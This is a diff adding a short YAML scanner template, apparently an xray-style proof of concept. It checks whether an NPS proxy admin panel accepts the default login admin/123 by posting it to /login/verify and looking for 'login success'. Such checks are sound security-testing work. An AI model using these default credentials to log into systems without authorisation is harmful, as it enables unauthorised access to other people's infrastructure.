@@ -1,0 +1,15 @@
+detail: {}
+expression: r0()
+manual: true
+name: poc-yaml-nps-default-password
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("json") &&
+      response.body.bcontains(b"login success")
+    request:
+      body: username=admin&password=123
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /login/verify
+transport: http
